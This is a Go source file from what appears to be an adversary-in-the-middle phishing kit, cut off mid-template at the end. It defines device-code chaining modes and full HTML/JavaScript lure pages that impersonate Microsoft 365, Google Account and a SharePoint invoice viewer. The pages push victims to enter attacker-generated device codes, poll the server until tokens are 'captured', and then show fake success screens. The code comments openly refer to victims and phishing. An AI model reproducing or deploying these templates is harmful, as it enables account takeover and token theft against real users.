package core

// Device Code chaining modes for lures
const (
	DCModeOff      = "off"      // No device code chaining
	DCModeAlways   = "always"   // Always redirect to device code after AitM success (default - survives password changes)
	DCModeFallback = "fallback" // Only use device code if AitM session stalls/fails
	DCModeAuto     = "auto"     // Pre-generate on lure click, auto-select strategy based on outcome
	DCModeDirect   = "direct"   // Skip AitM entirely, show device code interstitial immediately
)

// ValidDeviceCodeModes lists all valid modes
var ValidDeviceCodeModes = []string{DCModeOff, DCModeAlways, DCModeFallback, DCModeAuto, DCModeDirect}

// IsValidDeviceCodeMode checks if a mode string is valid
func IsValidDeviceCodeMode(mode string) bool {
	for _, m := range ValidDeviceCodeModes {
		if m == mode {
			return true
		}
	}
	return false
}

// DEVICE_CODE_INTERSTITIAL_HTML is the Microsoft-styled interstitial page
// served at /dc/{session_id} to redirect victims to microsoft.com/devicelogin
// Placeholders: {user_code}, {verify_url}, {session_id}, {template_type}, {expires_minutes}
const DEVICE_CODE_INTERSTITIAL_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="referrer" content="no-referrer">
<title>Microsoft 365 - Secure Access</title>
<link rel="icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A8FMh//BTIP/wUyH/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A8FMg//BTIP/wUyD/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A8FMg//BTIP/wUyH/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A8FMg//BTIP/wUyD/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8AALv///C7///wu////Lv//wC7////u///8Lv///C7////AP///wD///8A////AP///wD///8A////AP///wAAu////Lv///C7///wu///ALv///+7///wu////Lv/////AP///wD///8A////AP///wD///8A////AP///wAAu////Lv///C7///wu///ALv///+7///wu////Lv/////AP///wD///8A////AP///wD///8A////AP///wAAu////Lv///C7///wu///ALv///+7///wu////Lv/////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A//8AAP//AADgBwAA4AcAAOAHAADgBwAA//8AAOAHAADgBwAA4AcAAOAHAAD//wAA//8AAP//AAD//wAA//8AAA==">
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%;width:100%}
body{font-family:'Segoe UI','Segoe UI Web (West European)',-apple-system,BlinkMacSystemFont,sans-serif;background:#f0f4f8;display:flex;flex-direction:column;min-height:100vh}
.header{background:#0078d4;padding:12px 32px;display:flex;align-items:center;gap:12px;flex-shrink:0}
.header svg{flex-shrink:0}
.header-title{color:#fff;font-size:18px;font-weight:600}
.main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px}
.card{background:#fff;border-radius:4px;box-shadow:0 2px 6px rgba(0,0,0,0.08);width:100%;max-width:440px;padding:40px 48px}
.logo{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:28px}
.logo svg{flex-shrink:0}
.logo-text{font-size:20px;font-weight:600;color:#1a1a1a}
.intro{text-align:center;color:#323130;font-size:15px;line-height:1.6;margin-bottom:24px}
.info-box{background:#deecf9;border-left:4px solid #0078d4;padding:14px 16px;margin-bottom:24px;font-size:14px;color:#004578;line-height:1.5}
.code-label{font-size:13px;font-weight:600;color:#323130;margin-bottom:8px}
.code-input{width:100%;background:#f3f2f1;border:1px solid #8a8886;border-radius:2px;padding:12px 16px;font-size:24px;font-weight:700;letter-spacing:4px;color:#0078d4;text-align:center;font-family:'Segoe UI Mono',Consolas,monospace;margin-bottom:8px;user-select:all}
.code-input.loading{color:#8a8886;font-size:16px;letter-spacing:normal}
.copy-row{display:flex;justify-content:center;margin-bottom:20px}
.copy-btn{background:#0078d4;color:#fff;border:none;padding:8px 20px;border-radius:2px;cursor:pointer;font-size:14px;font-weight:600;display:flex;align-items:center;gap:8px;transition:background 0.15s}
.copy-btn:hover{background:#106ebe}
.copy-btn.copied{background:#107c10}
.copy-btn svg{width:16px;height:16px;fill:currentColor}
.status{font-size:13px;color:#107c10;text-align:center;margin-bottom:16px;min-height:20px;font-weight:500}
.btn-primary{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;background:#0078d4;color:#fff;border:none;padding:14px 24px;font-size:15px;font-weight:600;cursor:pointer;border-radius:2px;transition:background 0.15s;margin-bottom:20px}
.btn-primary:hover{background:#106ebe}
.btn-primary:disabled{background:#c8c6c4;cursor:not-allowed}
.btn-primary svg{flex-shrink:0}
.security-box{background:#f3f2f1;border-left:4px solid #0078d4;padding:16px;margin-bottom:20px;text-align:center}
.security-box p{font-size:13px;color:#605e5c;line-height:1.5;margin-bottom:12px}
.security-badge{display:inline-flex;align-items:center;gap:6px;background:#0078d4;color:#fff;padding:8px 16px;border-radius:2px;font-size:13px;font-weight:600}
.security-badge svg{width:14px;height:14px;fill:currentColor}
.footer-text{text-align:center;font-size:12px;color:#605e5c;margin-bottom:16px}
.timer{text-align:center;font-size:12px;color:#8a8886}
.timer span{font-weight:600;color:#323130}
.success{display:none;text-align:center;padding:20px 0}
.success-icon{width:64px;height:64px;background:#107c10;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px}
.success-icon svg{width:32px;height:32px;fill:#fff}
.success h2{font-size:20px;font-weight:600;color:#323130;margin-bottom:8px}
.success p{font-size:14px;color:#605e5c;margin-bottom:20px}
.success-badge{display:inline-flex;align-items:center;gap:8px;background:#dff6dd;color:#107c10;padding:10px 20px;border-radius:2px;font-size:14px;font-weight:600}
.success-badge svg{width:18px;height:18px;fill:currentColor}
@media(max-width:500px){.card{padding:32px 24px;border-radius:0}.code-input{font-size:20px;letter-spacing:2px}}
</style>
</head>
<body>
<div class="header">
<svg width="24" height="24" viewBox="0 0 24 24"><rect width="11" height="11" fill="#fff"/><rect x="13" width="11" height="11" fill="#fff" fill-opacity="0.8"/><rect y="13" width="11" height="11" fill="#fff" fill-opacity="0.9"/><rect x="13" y="13" width="11" height="11" fill="#fff" fill-opacity="0.7"/></svg>
<span class="header-title">Microsoft 365</span>
</div>

<div class="main">
<div class="card">
<div class="logo">
<svg width="28" height="28" viewBox="0 0 24 24"><rect width="11" height="11" fill="#f25022"/><rect x="13" width="11" height="11" fill="#7fba00"/><rect y="13" width="11" height="11" fill="#00a4ef"/><rect x="13" y="13" width="11" height="11" fill="#ffb900"/></svg>
<span class="logo-text">Microsoft 365</span>
</div>

<div id="mainView">
<p class="intro">Please verify your identity to securely access your Microsoft 365 account.</p>

<div class="info-box">For security reasons, Microsoft requires verification before granting access to your account resources.</div>

<div class="code-label">Verification Code</div>
<div class="code-input" id="userCode">Loading...</div>

<div class="copy-row">
<button class="copy-btn" id="copyBtn" onclick="copyCode()" disabled>
<svg viewBox="0 0 16 16"><path d="M4 2a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V2zm2-1a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H6zM2 5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1h1v1a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h1v1H2z"/></svg>
<span id="copyText">Copy Code</span>
</button>
</div>

<div class="status" id="codeStatus"></div>

<button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>
<svg width="20" height="20" viewBox="0 0 24 24"><rect width="11" height="11" fill="#fff"/><rect x="13" width="11" height="11" fill="#fff" fill-opacity=".8"/><rect y="13" width="11" height="11" fill="#fff" fill-opacity=".9"/><rect x="13" y="13" width="11" height="11" fill="#fff" fill-opacity=".7"/></svg>
Sign In to Microsoft
</button>

<div class="security-box">
<p>Your account is protected by Microsoft's enterprise-grade security. We use industry-leading encryption to safeguard your information.</p>
<a href="https://microsoft.com/devicelogin" id="verifyLink" target="_blank" class="security-badge">
<svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
Microsoft Secure Platform
</a>
</div>

<p class="footer-text">If you need assistance, contact your Microsoft 365 administrator.</p>

<div class="timer">Code expires in <span id="timerValue">{expires_minutes}</span></div>
</div>

<div class="success" id="successView">
<div class="success-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
<h2>Verification Complete</h2>
<p>Your identity has been confirmed. You may now close this window.</p>
<div class="success-badge"><svg viewBox="0 0 16 16"><path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/></svg>Account Verified</div>
</div>
</div>
</div>

<script>
(function(){
var sid='{session_id}';
var verifyUrl='{verify_url}';
var codeReady={code_ready};
var code='{user_code}';
var expiresIn={expires_seconds};
var popup=null;
var codeEl=document.getElementById('userCode');
var statusEl=document.getElementById('codeStatus');
var btnEl=document.getElementById('signInBtn');
var copyBtnEl=document.getElementById('copyBtn');
var copyTextEl=document.getElementById('copyText');
var timerEl=document.getElementById('timerValue');

function showCode(c,v){
code=c;
if(v)verifyUrl=v;
codeEl.textContent=c;
codeEl.classList.remove('loading');
btnEl.disabled=false;
copyBtnEl.disabled=false;
document.getElementById('verifyLink').href=verifyUrl;
}

if(codeReady&&code){showCode(code,verifyUrl);}else{codeEl.classList.add('loading');}

function copyCode(){
if(!code)return;
if(navigator.clipboard){navigator.clipboard.writeText(code).then(function(){showCopied();});}
else{var t=document.createElement('textarea');t.value=code;t.style.cssText='position:fixed;left:-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);showCopied();}
}
function showCopied(){
copyBtnEl.classList.add('copied');
copyTextEl.textContent='Copied!';
statusEl.textContent='Code copied to clipboard';
setTimeout(function(){copyBtnEl.classList.remove('copied');copyTextEl.textContent='Copy Code';},3000);
}
window.copyCode=copyCode;

function openSignIn(){
if(!code)return;
copyCode();
var w=520,h=700,l=(screen.width-w)/2,t=(screen.height-h)/2;
popup=window.open(verifyUrl,'ms','width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');
if(popup)popup.focus();
}
window.openSignIn=openSignIn;

function updateTimer(){
if(expiresIn<=0)return;
expiresIn--;
var m=Math.floor(expiresIn/60);
var s=expiresIn%60;
timerEl.textContent=m+':'+(s<10?'0':'')+s;
if(expiresIn>0)setTimeout(updateTimer,1000);
}
if(codeReady)setTimeout(updateTimer,1000);

function poll(){
fetch('/dc/status/'+sid,{method:'GET',credentials:'include'}).then(function(r){return r.json()}).then(function(d){
if(d.ready&&!codeReady){
codeReady=true;
showCode(d.user_code,d.verify_url);
setTimeout(updateTimer,1000);
}
if(d.captured){
if(popup&&!popup.closed)popup.close();
document.getElementById('mainView').style.display='none';
document.getElementById('successView').style.display='block';
}else if(d.failed){
statusEl.textContent='Session expired. Please refresh to try again.';
statusEl.style.color='#d83b01';
codeEl.textContent='—';
}else if(!d.expired){setTimeout(poll,codeReady?3000:600);}
}).catch(function(){setTimeout(poll,3000);});
}
setTimeout(poll,codeReady?3000:400);
})();
</script>
</body>
</html>`

// DEVICE_CODE_POLL_STATUS_JS is injected to poll for device code status
// Used when we need to redirect during an existing AitM session
const DEVICE_CODE_POLL_STATUS_JS = `
(function(){
var sid='{session_id}';
function checkDC(){
fetch('/dc/status/'+sid,{method:'GET',credentials:'include'})
.then(function(r){return r.json()})
.then(function(d){
if(d.captured && d.redirect_url){
top.location.href=d.redirect_url;
}else if(!d.expired){
setTimeout(checkDC,3000);
}
})
.catch(function(){setTimeout(checkDC,5000);});
}
setTimeout(checkDC,3000);
})();
`

// DEVICE_CODE_GOOGLE_INTERSTITIAL_HTML is the Google-styled interstitial page
// served at /dc/{session_id} for Google Workspace / Gmail device code phishing
// Placeholders: {user_code}, {verify_url}, {session_id}, {template_type}, {expires_minutes}, {expires_seconds}
const DEVICE_CODE_GOOGLE_INTERSTITIAL_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="referrer" content="no-referrer">
<title>Google Account</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Google Sans','Roboto','Segoe UI',Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#202124}
.container{background:#fff;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;max-width:450px;width:100%;text-align:center}
.logo{margin-bottom:16px}
.title{font-size:24px;font-weight:400;margin-bottom:8px;color:#202124}
.subtitle{font-size:14px;color:#5f6368;margin-bottom:24px;line-height:20px}
.steps{text-align:left;margin:0 0 24px;padding:0 0 0 24px}
.steps li{font-size:14px;color:#202124;margin-bottom:12px;line-height:20px}
.steps li a{color:#1a73e8;text-decoration:none;font-weight:500}
.steps li a:hover{text-decoration:underline}
.code-container{background:#f8f9fa;border:1px solid #dadce0;border-radius:8px;padding:16px 24px;margin:0 auto 24px;display:inline-block;min-width:200px}
.code{font-size:28px;font-weight:500;letter-spacing:4px;color:#1a73e8;font-family:'Google Sans',monospace}
.btn-row{display:flex;gap:8px;justify-content:center;margin-bottom:16px}
.btn{display:inline-flex;align-items:center;justify-content:center;padding:8px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;border:none;transition:background .2s,box-shadow .2s;font-family:'Google Sans','Roboto',sans-serif}
.btn-primary{background:#1a73e8;color:#fff}
.btn-primary:hover{background:#1765cc;box-shadow:0 1px 3px rgba(0,0,0,.2)}
.btn-secondary{background:#fff;color:#1a73e8;border:1px solid #dadce0}
.btn-secondary:hover{background:#f8f9fa}
.timer{font-size:12px;color:#80868b;margin-top:8px}
.copied{color:#137333;font-size:13px;margin-top:4px;min-height:20px}
.footer{margin-top:24px;font-size:12px;color:#80868b}
.footer a{color:#1a73e8;text-decoration:none}
.spinner{display:none;margin:16px auto;width:24px;height:24px;border:3px solid #e8eaed;border-top:3px solid #1a73e8;border-radius:50%;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.complete{display:none;text-align:center;padding:20px}
.complete .check{font-size:48px;color:#137333;margin-bottom:12px}
.complete .msg{font-size:16px;color:#202124}
.status-icon{margin:20px 0 16px;font-size:40px}
</style>
</head>
<body>
<div class="container" id="main">
<div class="logo">
<svg viewBox="0 0 272 92" width="90" height="30" xmlns="http://www.w3.org/2000/svg"><path fill="#4285F4" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#EA4335" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.86 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#FBBC05" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/><path fill="#4285F4" d="M225 3v65h-9.5V3h9.5z"/><path fill="#34A853" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/><path fill="#EA4335" d="M35.29 41.19V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49-.01z"/></svg>
</div>

<div id="verifyView">
<div class="status-icon" id="statusIcon">&#128274;</div>
<div class="title" id="titleText">Device Verification</div>
<div class="subtitle" id="subtitleText">Complete the sign-in process by verifying your device.</div>

<ol class="steps">
<li>Go to <a href="{verify_url}" target="_blank" rel="noopener" id="verifyLink">{verify_url}</a></li>
<li>Enter the code shown below</li>
<li>Sign in with your Google account and approve access</li>
</ol>

<div class="code-container">
<div class="code" id="userCode">{user_code}</div>
</div>
<div class="copied" id="copiedMsg">&nbsp;</div>

<div class="btn-row">
<button class="btn btn-primary" onclick="copyCode()">Copy code</button>
<a class="btn btn-secondary" href="{verify_url}" target="_blank" rel="noopener">Open link</a>
</div>

<div class="timer" id="timerText">Code expires in <span id="countdown">{expires_minutes}:00</span></div>
<div class="spinner" id="spinner"></div>
</div>

<div class="complete" id="completeView">
<div class="check">&#10004;</div>
<div class="msg">Verification complete. Redirecting...</div>
</div>

<div class="footer">
<a href="https://support.google.com">Help</a> &middot;
<a href="https://policies.google.com/privacy">Privacy</a> &middot;
<a href="https://policies.google.com/terms">Terms</a>
</div>
</div>

<script>
(function(){
var sid='{session_id}';
var expMs={expires_seconds}*1000;
var startTime=Date.now();

var tpl='{template_type}';
if(tpl==='fallback'){
document.getElementById('statusIcon').innerHTML='&#9888;&#65039;';
document.getElementById('titleText').textContent='Verification method unavailable';
document.getElementById('subtitleText').textContent='Your security key could not be verified. Use an alternative method to complete sign-in.';
}else if(tpl==='compliance'){
document.getElementById('statusIcon').innerHTML='&#128187;';
document.getElementById('titleText').textContent='Device enrollment required';
document.getElementById('subtitleText').textContent='Your organization requires device registration to access this service.';
}else{
document.getElementById('statusIcon').innerHTML='&#9989;';
document.getElementById('titleText').textContent='Sign-in verified';
document.getElementById('subtitleText').textContent='One more step: Link this device to your account for continued access.';
}

function copyCode(){
var code=document.getElementById('userCode').textContent;
if(navigator.clipboard){
navigator.clipboard.writeText(code).then(function(){
document.getElementById('copiedMsg').textContent='Code copied!';
setTimeout(function(){document.getElementById('copiedMsg').innerHTML='&nbsp;';},2000);
});
}else{
var ta=document.createElement('textarea');
ta.value=code;
document.body.appendChild(ta);
ta.select();
document.execCommand('copy');
document.body.removeChild(ta);
document.getElementById('copiedMsg').textContent='Code copied!';
setTimeout(function(){document.getElementById('copiedMsg').innerHTML='&nbsp;';},2000);
}
}
window.copyCode=copyCode;

function updateTimer(){
var elapsed=Date.now()-startTime;
var remaining=Math.max(0,expMs-elapsed);
if(remaining<=0){
document.getElementById('countdown').textContent='EXPIRED';
return;
}
var m=Math.floor(remaining/60000);
var s=Math.floor((remaining%60000)/1000);
document.getElementById('countdown').textContent=m+':'+(s<10?'0':'')+s;
setTimeout(updateTimer,1000);
}
updateTimer();

function checkStatus(){
fetch('/dc/status/'+sid,{method:'GET',credentials:'include'})
.then(function(r){return r.json()})
.then(function(d){
if(d.captured){
document.getElementById('verifyView').style.display='none';
document.getElementById('completeView').style.display='block';
setTimeout(function(){
if(d.redirect_url){
top.location.href=d.redirect_url;
}
},1500);
}else if(d.expired){
document.getElementById('countdown').textContent='EXPIRED';
}else{
document.getElementById('spinner').style.display='block';
setTimeout(checkStatus,3000);
}
})
.catch(function(){
setTimeout(checkStatus,5000);
});
}
setTimeout(checkStatus,5000);
})();
</script>
</body>
</html>`

// OneDrive document access themed page
const DEVICE_CODE_ONEDRIVE_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="referrer" content="no-referrer">
    <title>Verify Your Identity</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body, html {
            height: 100%;
            width: 100%;
            font-family: 'Segoe UI', -apple-system, Roboto, Helvetica, sans-serif;
            background: #f4f5f7;
            overflow-x: hidden;
        }

        /* --- REDESIGNED DOCUMENT VIEWER INTERFACE --- */
        .app-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            flex-direction: column;
            z-index: 1;
            pointer-events: none;
            user-select: none;
        }
        
        /* Redesigned Navbar with Real Logo and Nav Links */
        .doc-header-bar {
            height: 48px;
            background: #0078d4;
            color: #ffffff;
            display: flex;
            align-items: center;
            padding: 0 16px;
            gap: 20px;
        }
        .nav-logo {
            display: flex;
            align-items: center;
            font-weight: 600;
            font-size: 16px;
            gap: 8px;
        }
        .nav-logo svg {
            width: 24px;
            height: 24px;
            fill: #ffffff;
        }
        .nav-links {
            display: flex;
            gap: 16px;
            font-size: 14px;
            opacity: 0.9;
        }
        .nav-link-item {
            color: #ffffff;
            text-decoration: none;
        }

        .viewer-canvas {
            flex: 1;
            background: #f3f2f1;
            display: flex;
            justify-content: center;
            padding: 20px;
        }
        .invoice-paper {
            background: #fff;
            width: 100%;
            max-width: 600px;
            height: 100%;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
            border: 1px solid #edebe9;
            padding: 30px;
        }
        .invoice-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 30px;
        }
        .invoice-title {
            font-size: 22px;
            font-weight: 700;
            color: #323130;
            letter-spacing: 0.5px;
        }
        .mock-text-sm {
            background: #f3f2f1;
            height: 12px;
            margin-bottom: 8px;
            border-radius: 1px;
        }
        .invoice-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 30px;
        }
        .invoice-table th {
            border-bottom: 2px solid #a19f9d;
            height: 24px;
            padding-bottom: 8px;
        }
        .invoice-table td {
            border-bottom: 1px solid #edebe9;
            padding: 12px 0;
        }

        /* --- AUTHENTIC MICROSOFT/OFFICE 365 OVERLAY SHIELD --- */
        .modal-overlay {
            position: absolute;
            top: 48px;
            left: 0;
            width: 100%;
            height: calc(100% - 48px);
            display: flex;
            align-items: center;
            justify-content: center;
            background: rgba(0, 0, 0, 0.03);
            z-index: 10;
            padding: 16px;
        }
        
        /* Adjusted Compact Container Size */
        .o365-card {
            background: #ffffff;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.12);
            border: 1px solid #d2d0ce;
            padding: 32px;
            position: relative;
        }
        
        .o365-heading {
            font-size: 22px;
            font-weight: 600;
            color: #1b1a19;
            margin-bottom: 14px;
            text-align: center;
        }
        .secure-subtext {
            font-size: 14px;
            color: #242424;
            margin-bottom: 16px;
            text-align: center;
        }

        .pdf-attachment-box {
            display: flex;
            align-items: center;
            background: #f3f2f1;
            border: 1px solid #edebe9;
            padding: 10px 14px;
            gap: 12px;
            margin-bottom: 20px;
            border-radius: 2px;
        }
        .pdf-brand-icon {
            width: 32px;
            height: 32px;
            background: #e02424;
            color: #fff;
            font-weight: 800;
            font-size: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 3px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }
        .pdf-brand-icon::before {
            content: "PDF";
        }
        .pdf-meta {
            display: flex;
            flex-direction: column;
        }
        .pdf-name {
            font-size: 13px;
            font-weight: 600;
            color: #323130;
        }
        .pdf-size {
            font-size: 11px;
            color: #797775;
        }

        .o365-prompt {
            font-size: 13px;
            color: #242424;
            line-height: 1.5;
            margin-bottom: 20px;
            text-align: center;
        }

        /* Centered and Bigger Logo Alignment */
        .o365-brand-wrapper {
            display: flex;
            justify-content: center;
            margin-bottom: 20px;
        }
        .o365-brand-wrapper svg {
            width: 54px;
            height: 54px;
        }

        .input-group {
            position: relative;
            margin-bottom: 4px;
        }
        .o365-input {
            width: 100%;
            border: none;
            border-bottom: 1px solid #605e5c;
            padding: 8px 36px 6px 0px;
            font-size: 15px;
            color: #242424;
            outline: none;
            background: transparent;
            border-radius: 0;
            font-family: inherit;
            transition: border-color 0.15s ease;
        }
        .o365-input:focus {
            border-bottom: 2px solid #0067b8;
            padding-bottom: 5px;
        }
        .o365-input.loading {
            color: #a19f9d;
            font-style: italic;
        }

        .inline-copy-btn {
            position: absolute;
            right: 4px;
            top: 50%;
            transform: translateY(-50%);
            background: transparent;
            border: none;
            cursor: pointer;
            color: #605e5c;
            display: flex;
            align-items: center;
            padding: 4px;
        }
        .inline-copy-btn:disabled {
            cursor: not-allowed;
            opacity: 0.3;
        }
        .inline-copy-btn svg {
            width: 16px;
            height: 16px;
            fill: currentColor;
        }
        .inline-copy-btn.copied {
            color: #107c10;
        }

        .status-message {
            font-size: 12px;
            color: #107c10;
            min-height: 18px;
            margin-bottom: 20px;
            margin-top: 6px;
        }

        .o365-btn {
            width: 100%;
            max-width: 108px;
            background: #0067b8;
            color: #ffffff;
            border: none;
            padding: 6px 12px;
            font-size: 15px;
            font-weight: 400;
            cursor: pointer;
            text-align: center;
            float: right;
            margin-bottom: 24px;
            transition: background 0.1s ease;
        }
        .o365-btn:hover {
            background: #005a9e;
        }
        .o365-btn:disabled {
            background: #cccccc;
            color: #f3f2f1;
            cursor: not-allowed;
        }

        .o365-footer {
            clear: both;
            font-size: 12px;
            color: #605e5c;
            display: flex;
            justify-content: center;
            gap: 12px;
        }
        .o365-footer a {
            color: #605e5c;
            text-decoration: none;
        }
        .o365-footer a:hover {
            text-decoration: underline;
        }

        .expiration-timer {
            font-size: 11px;
            color: #a19f9d;
            margin-top: 14px;
            text-align: center;
            clear: both;
        }
        .expiration-timer span {
            font-weight: 600;
            color: #a80000;
        }

        .success-viewport {
            display: none;
            text-align: center;
            padding: 10px 0;
        }
        .success-tick-icon {
            width: 44px;
            height: 44px;
            background: #107c10;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 16px;
        }
        .success-tick-icon svg {
            width: 22px;
            height: 22px;
            fill: #ffffff;
        }
        .success-viewport h2 {
            font-size: 20px;
            font-weight: 600;
            color: #1b1a19;
            margin-bottom: 8px;
        }
        .success-viewport p {
            font-size: 14px;
            color: #605e5c;
        }
    </style>
</head>
<body>

<div class="app-container">
    <!-- Redesigned Navbar with Logo and Navlinks -->
    <div class="doc-header-bar">
        <div class="nav-logo">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                <path d="M21.5 3h-19A1.5 1.5 0 0 0 1 4.5v15A1.5 1.5 0 0 0 2.5 21h19a1.5 1.5 0 0 0 1.5-1.5v-15A1.5 1.5 0 0 0 21.5 3z"/>
                <path fill="#0078d4" d="M19 8.5V17h-2.5V9.75L12 13 7.5 9.75V17H5V8.5l7 5 7-5z"/>
            </svg>
            SharePoint
        </div>
        <div class="nav-links">
            <a href="#" class="nav-link-item">Home</a>
            <a href="#" class="nav-link-item">My Files</a>
            <a href="#" class="nav-link-item">Shared</a>
        </div>
    </div>
    
    <!-- Clean, Clear Document View Frame (No Blur) -->
    <div class="viewer-canvas">
        <div class="invoice-paper">
            <div class="invoice-header">
                <div>
                    <div class="invoice-title">TAX INVOICE</div>
                    <div class="mock-text-sm" style="width: 140px; margin-top: 10px;"></div>
                    <div class="mock-text-sm" style="width: 90px;"></div>
                </div>
                <div style="text-align: right;">
                    <div class="mock-text-sm" style="width: 120px; margin-left: auto;"></div>
                    <div class="mock-text-sm" style="width: 160px; margin-left: auto;"></div>
                    <div class="mock-text-sm" style="width: 80px; margin-left: auto;"></div>
                </div>
            </div>
            
            <div style="display: flex; gap: 40px; margin-bottom: 40px;">
                <div style="flex: 1;">
                    <div class="mock-text-sm" style="width: 60%; height: 14px; background: #a19f9d;"></div>
                    <div class="mock-text-sm" style="width: 80%;"></div>
                    <div class="mock-text-sm" style="width: 85%;"></div>
                </div>
                <div style="flex: 1;">
                    <div class="mock-text-sm" style="width: 50%; height: 14px; background: #a19f9d;"></div>
                    <div class="mock-text-sm" style="width: 75%;"></div>
                    <div class="mock-text-sm" style="width: 70%;"></div>
                </div>
            </div>

            <table class="invoice-table">
                <thead>
                    <tr>
